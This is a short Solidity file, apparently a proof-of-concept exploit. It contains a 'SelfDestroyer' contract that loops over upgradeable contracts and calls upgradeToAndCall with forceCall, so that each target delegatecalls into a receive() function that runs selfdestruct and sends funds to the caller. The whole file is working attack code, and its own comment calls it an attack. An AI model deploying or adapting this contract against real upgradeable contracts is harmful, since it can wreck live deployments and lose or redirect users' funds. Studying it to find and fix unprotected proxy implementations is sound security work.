// SPDX-License-Identifier: MIT

pragma solidity 0.8.10;

interface Upgradeable {
    function upgradeToAndCall(
        address newImplementation,
        bytes memory data,
        bool forceCall
    ) external;
}

contract SelfDestroyer {
    /**
     * For maximum laziness, we just call self-destruct in the receive() function
     * so that we can trigger the attack with empty calldata
     */
    receive() external payable {
        selfdestruct(payable(msg.sender));
    }

    function destroyMany(Upgradeable[] calldata contracts) external {
        for (uint i = 0; i < contracts.length; i++) {
            contracts[i].upgradeToAndCall(address(this), "", true);
        }
    }
}